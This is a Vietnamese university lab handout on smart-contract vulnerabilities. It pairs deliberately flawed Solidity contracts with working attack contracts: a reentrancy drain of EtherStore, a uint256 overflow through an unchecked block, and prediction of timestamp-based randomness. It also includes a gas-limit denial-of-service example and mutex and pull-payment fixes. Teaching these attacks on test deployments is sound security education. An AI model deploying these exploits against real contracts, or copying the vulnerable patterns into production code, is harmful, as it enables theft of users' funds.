Phần 1: Tấn công Tái nhập (Reentrancy) Cơ bản

1.1. Tái hiện kịch bản tấn công

Yêu cầu 1 (Bắt buộc):

Sử dụng mã nguồn EtherStore.sol và Attack.sol dưới đây để thực hiện tấn công rút cạn tiền.

Bấm để xem Code mẫu EtherStore.sol & Attack.sol 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        // LỖ HỔNG: Gửi tiền trước khi cập nhật số dư
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Hàm này được gọi khi EtherStore gửi ETH về
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
}

Hướng dẫn từng bước:

  1. Copy code vào Remix IDE, tạo 2 file riêng hoặc chung 1 file.
  2. Compile với phiên bản 0.8.20.
  3. Triển khai EtherStore trước.
  4. Chuyển Account sang ví khác, nạp 5 Ether vào EtherStore qua hàm deposit.
  5. Copy địa chỉ contract EtherStore.
  6. Triển khai Attack với tham số constructor là địa chỉ EtherStore vừa copy.
  7. Gọi hàm attack của contract Attack với Value là 1 Ether.
  8. Báo cáo: Chụp ảnh số dư cuối cùng của Attack contract và Logs giao dịch (thể hiện hàm withdraw được gọi nhiều lần).

1.2. Phòng chống thủ công (Không dùng thư viện) Trung bình

Yêu cầu 2 (Coding):

Viết contract EtherStore_ManualLock.sol sử dụng cơ chế Mutex (cờ khóa) để chặn Reentrancy.

Gợi ý Code (Sinh viên cần điền vào chỗ trống) 
contract EtherStore_ManualLock {
    bool internal locked; // Biến cờ khóa

    // Định nghĩa modifier để chặn gọi lại
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true; // Khóa lại trước khi chạy hàm
        _;
        locked = false; // Mở khóa sau khi chạy xong
    }

    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Áp dụng modifier vào đây
    function withdraw() public noReentrant {
        // ... Copy logic rút tiền từ bài trước vào đây ...
    }
}

Phần 2: Tràn số (Overflow) & Unchecked Block Trung bình

Yêu cầu 3 (Xây dựng & Khai thác):

Lợi dụng khối unchecked trong Solidity 0.8.x để vượt qua kiểm tra số dư.

Gợi ý Code RiskyToken.sol 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract RiskyToken {
    mapping(address => uint256) public balances;

    constructor() {
        balances[msg.sender] = 1000; // Mint cho deployer
    }

    function batchTransfer(address[] calldata receivers, uint256 value) external {
        // LỖ HỔNG NẰM Ở ĐÂY
        uint256 totalAmount;
        
        // Sử dụng unchecked cho phép nhân để tối ưu gas nhưng gây nguy hiểm
        unchecked {
            totalAmount = receivers.length * value;
        }

        require(balances[msg.sender] >= totalAmount, "Insufficient balance");

        balances[msg.sender] -= totalAmount;
        for (uint i = 0; i < receivers.length; i++) {
            balances[receivers[i]] += value;
        }
    }
}

Hướng dẫn từng bước & Câu hỏi gợi ý:

  1. Triển khai RiskyToken. SV sẽ có 1000 token.
  2. Giả sử SV muốn hack để gửi số tiền khổng lồ mà không bị trừ đúng số dư.
  3. Hãy tính toán: receivers.length * value cần phải bằng bao nhiêu để bị tràn số (Overflow) về một số nhỏ hơn 1000?
    • Gợi ý: type(uint256).max là khoảng 1.1579... x 10^77.
    • Nếu SV chọn mảng receivers có 2 địa chỉ. Hãy tìm value sao cho: 2 * value = (MAX_UINT + 1) + số_nhỏ.
    • Khi đó totalAmount sẽ trở thành số_nhỏ, qua mặt được require, nhưng balances[receivers[i]] lại được cộng value cực lớn.
  4. Báo cáo: Chụp ảnh số dư của người nhận sau khi hack thành công (số dư sẽ cực lớn).

Phần 3: Lỗ hổng Randomness (Yếu tố ngẫu nhiên) Khó

Yêu cầu 4 (Tự triển khai Game & Hack):

Dự đoán kết quả ngẫu nhiên dựa trên biến môi trường Blockchain.

Code mẫu WeakLottery.sol 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract WeakLottery {
    function play() public payable {
        require(msg.value == 0.1 ether);
        // Random yếu dựa trên timestamp
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 2;
        
        if (random == 1) {
            // Thắng: Trả lại tiền + thưởng
            payable(msg.sender).transfer(0.2 ether);
        }
    }
    
    // Nạp tiền vào quỹ thưởng
    receive() external payable {}
}

Hướng dẫn viết LotteryAttacker.sol:

  • Sinh viên cần viết một contract tấn công. Trong hàm tấn công, SV thực hiện chính xác công thức tính random của WeakLottery.
  • Mẹo: Khi contract A gọi contract B, cả hai đều chạy trong cùng một Block, nên block.timestamp là GIỐNG HỆT NHAU.
  • Tuy nhiên, lưu ý biến msg.sender trong công thức của WeakLottery. Khi SV gọi từ contract Attacker, msg.sender lúc này là địa chỉ của Attacker.
Gợi ý Code Attacker (Chưa hoàn chỉnh) 
contract LotteryAttacker {
    WeakLottery public lottery;

    constructor(address _lottery) {
        lottery = WeakLottery(_lottery);
    }

    function attack() public payable {
        // Tính trước kết quả y hệt logic của nạn nhân
        // Lưu ý: msg.sender ở đây chính là địa chỉ của contract này (address(this))
        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 2;
        
        if (guess == 1) {
            // Chỉ chơi nếu biết chắc chắn thắng
            lottery.play{value: 0.1 ether}();
        } else {
            // Nếu thua thì không chơi, đợi block sau
            revert("Khong choi vi se thua");
        }
    }
    
    receive() external payable {}
}

Báo cáo: Deploy Lottery, nạp quỹ. Deploy Attacker. Gọi hàm attack nhiều lần. Chứng minh SV chỉ mất gas fee chứ không bao giờ mất tiền cược.

Phần 4: Từ chối dịch vụ (DoS via Gas Limit) Nâng cao

Yêu cầu 5 (Mô phỏng & Giải pháp):

Lỗ hổng này xảy ra khi vòng lặp xử lý quá nhiều phần tử, vượt quá giới hạn Gas của một Block.

Code mẫu RefundPool (Lỗi DoS) 
contract RefundPool {
    address[] public users;
    mapping(address => uint) public balances;

    function deposit() external payable {
        users.push(msg.sender);
        balances[msg.sender] += msg.value;
    }

    function refundAll() external {
        // Vòng lặp này sẽ tốn quá nhiều gas nếu mảng users quá lớn
        for (uint i = 0; i < users.length; i++) {
            address user = users[i];
            uint amount = balances[user];
            balances[user] = 0;
            (bool success, ) = user.call{value: amount}("");
            require(success);
        }
    }
}

Hướng dẫn thực hiện:

  1. Triển khai RefundPool.
  2. Tạo một contract phụ tên Spammer để thêm 100 user giả vào Pool. 
    // Gợi ý Spammer
contract Spammer {
    function spam(address pool) public payable {
        for(uint i=0; i<50; i++) {
            // Gọi deposit của pool (logic giả lập)
            // Có thể cần deploy nhiều contract con hoặc dùng trick khác để tạo nhiều address
            // Cách đơn giản nhất cho Lab: Gọi deposit thủ công 10-20 lần hoặc dùng script js trong Remix.
        }
    }
}
    (Lưu ý: Để đơn giản hóa bài lab này, SV có thể chỉ cần gọi deposit thủ công khoảng 15-20 lần và quan sát thanh Gas Cost tăng lên như thế nào).
  3. Giải pháp Pull Over Push: Thay vì dùng vòng lặp refundAll, hãy viết hàm withdraw để từng user tự rút tiền của mình.
Gợi ý Code Secure (Pull Pattern) 
contract RefundPool_Secure {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // Không còn hàm refundAll
    // User phải tự gọi hàm này -> Tránh DoS
    function withdraw() external {
        uint amount = balances[msg.sender];
        require(amount > 0);
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}

Báo cáo: Giải thích tại sao cách làm Secure lại không bị ảnh hưởng bởi số lượng người dùng (O(1) so với O(n)).
